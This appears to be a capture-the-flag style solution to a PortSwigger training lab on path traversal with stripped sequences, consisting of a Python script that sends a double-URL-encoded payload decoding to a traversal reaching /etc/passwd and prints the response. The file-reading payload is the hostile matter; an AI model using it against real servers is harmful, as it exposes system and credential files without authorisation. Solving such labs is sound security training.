# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

link to lab: https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode

Solution: 

```python
import requests

response = requests.get(
    'https://0a480054031b2c84c001c2e2002a0090.web-security-academy.net/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34',
    verify=False,
)

print(response.text)
```